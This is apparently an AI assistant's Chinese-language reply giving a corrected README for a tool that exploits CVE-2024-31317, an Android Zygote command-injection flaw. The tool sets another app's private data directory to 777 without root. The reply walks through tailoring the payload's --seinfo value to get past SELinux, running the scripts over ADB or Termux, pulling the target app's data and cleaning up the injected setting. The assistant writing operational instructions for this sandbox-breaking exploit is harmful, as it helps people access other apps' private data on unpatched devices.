确实遗漏了这一点，非常抱歉。脚本内部已经配置了默认参数（默认权限为 `777`，默认数据目录为 `user`），因此运行命令可以大幅度简化，直接传入包名即可，避免因手动输入多个参数而导致顺序颠倒报错。

以下是修正后的完整 `README.md`，已将调用脚本的命令全部修改为最简写形式：

***

# CVE-2024-31317 Android 目录权限修改工具

基于 CVE-2024-31317 (Zygote 命令注入漏洞) 实现的免 Root 修改 Android 应用私有数据目录权限工具。

### 1. 声明与限制
* **原作者**: [念__凡的个人空间 - Bilibili](https://space.bilibili.com/693202623)
* **支持系统**: Android 9 - 11。未适配 Android 12 - 13。
* **补丁限制**: 仅支持安全补丁在 2024 年 6 月之前的设备。
* **风险警告**: 漏洞利用存在风险，操作不当会导致设备变砖（无限重启/Bootloop）。请自愿承担相关损失和风险。

---

### 2. 核心安全步骤：手动恢复与验证 (极其重要)

**注意：脚本在执行完毕后并不会自动成功恢复系统的 `hidden_api_blacklist_exemptions` 配置。运行完任何脚本后，必须立即通过以下命令手动进行清理和验证，否则重启设备将直接导致变砖。**

在终端（PC 或高权限 Shell）中手动执行以下命令：

1. **清除注入数据**:
   ```bash
   adb shell settings put global hidden_api_blacklist_exemptions null
   # 或彻底删除配置项
   adb shell settings delete global hidden_api_blacklist_exemptions
   ```
2. **验证状态**:
   ```bash
   adb shell settings get global hidden_api_blacklist_exemptions
   ```
   **必须确保返回值为 `null` 或空，方可安全重启或进行其他系统操作。**

---

### 3. 针对目标应用修改脚本 (关键步骤)

由于 Android 的 SELinux 强制访问控制，必须针对目标应用修改脚本中的 Payload 参数（主要是 `--seinfo`），否则利用会静默失败（权限无变化）。

1. **导出目标应用的配置信息**（以 Windows PowerShell 为例）：
   ```powershell
   adb shell dumpsys package <package_name> > "$env:USERPROFILE\Desktop\<package_name>_package.txt"
   ```
2. **确认配置参数**：
   打开导出的 `.txt` 文件，全局搜索 `seinfo` 和 `targetSdkVersion`，获取它们的值。
3. **修改脚本 Payload**：
   用文本编辑器打开 `chdata_shell.sh` 或 `chdata_termux`，找到其中的 Payload 块，将 `--seinfo` 这一行修改为匹配目标应用的值：
   * **普通第三方应用**（如 `seinfo=default`）：
     ```bash
     --seinfo=default:targetSdkVersion=<实际版本>:complete
     ```
   * **系统平台签名应用**（如 `seinfo=platform`）：
     ```bash
     --seinfo=platform:privapp:targetSdkVersion=<实际版本>:complete
     ```

---

### 4. chdata_shell.sh 使用方法 (电脑 ADB 协同)

适用于通过 PC 端的 ADB 交互式修改和备份。脚本内部不包含 `adb` 前缀。

1. **推送脚本至手机**:
   ```bash
   adb push chdata_shell.sh /data/local/tmp/chdata_shell.sh
   ```
2. **赋权并执行**:
   ```bash
   adb shell
   cd /data/local/tmp
   chmod +x chdata_shell.sh
   # 临时修改目标应用目录权限（默认修改为 777 权限，默认目录为 user）
   ./chdata_shell.sh <package_name>
   exit
   ```
3. **拉取目标应用数据进行备份**:
   ```bash
   adb pull /data/user/0/<package_name> ./AppBackup
   ```
4. **手动恢复目录的原始权限**:
   ```bash
   adb shell
   cd /data/local/tmp
   # 恢复目标目录的原始权限为 700
   ./chdata_shell.sh <package_name> 700
   exit
   ```

---

### 5. chdata_termux 使用方法 (本地 Termux)

适用于在 Termux 内部配合 ADB 无线调试客户端执行。

1. **将脚本复制到 Termux 的 home 目录并赋权**:
   ```bash
   cp <脚本文件目录>/chdata_termux ~/
   cd ~
   chmod 700 ./chdata_termux
   ```
2. **运行脚本**:
   ```bash
   # 直接传入包名即可运行（默认修改为 777 权限，默认目录为 user）
   ./chdata_termux <package_name>
   ```

---

### 6. 再次强调

所有操作流程结束后，必须再次验证系统配置已被完全还原：
```bash
adb shell settings get global hidden_api_blacklist_exemptions
```
确保其输出为 `null`。
